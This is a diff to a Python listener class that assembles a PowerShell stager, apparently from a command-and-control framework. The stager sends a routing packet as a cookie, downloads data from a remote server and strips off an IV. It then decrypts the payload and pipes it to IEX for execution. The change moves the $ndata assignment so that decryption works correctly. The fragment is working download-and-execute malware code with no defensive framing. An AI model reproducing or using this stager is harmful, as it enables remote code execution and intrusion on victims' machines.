@@ -356,8 +356,9 @@ class Listener:
             stager += f'$wc.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
             stager += "$mdata=$wc.DownloadData($hom+$t);"
             stager += "sleep(1);"
-            stager += "$ndata = $mdata;"
+            
             stager += "$miv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
+            stager += "$ndata = $mdata;"
 
             # decode everything and kick it over to IEX to kick off execution
             stager += "-join[Char[]](& $M $ndata ($mIV+$Kk))| IEX"
